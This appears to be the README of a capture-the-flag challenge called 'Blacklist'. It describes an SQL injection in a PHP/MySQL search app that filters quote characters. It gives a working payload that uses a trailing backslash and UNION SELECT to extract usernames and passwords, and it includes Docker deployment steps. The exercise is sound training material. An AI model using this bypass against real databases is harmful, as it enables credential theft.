# Name: Blacklist

## Description

You're a big boy now, you need to find the way without the quotes from philosophy.

Try this one http://141.85.224.118:13000/.

Score: 150

## Vulnerability

SQL Injection - The server does not escape characters before querying the database.
The server filter single quotation marks and double quotation marks.

## Exploit

We can use a payload like this: `and 0 union select 1,username,password from users #\` and the query will be:

```
select * from search_engine where title like 'and 0 union select 1, username,password from users #\' or description like 'and 0 union select 1, username,password from users #\' or link like 'and 0 union select 1,username,password from users #\';
```

Due to the fact that some `'` will be escaped because of `\` the query will be different.

## Environment

Web server with PHP and MYSQL support (deployable as a Docker container using files in `deploy/` folder)

## Deploy

Copy `deploy/` folder and run `make run`.

If you need to update the image and container, remove the old container with `make clean` and update the image (and container) using `make`.

It is not possible to update the container without updating the image first.
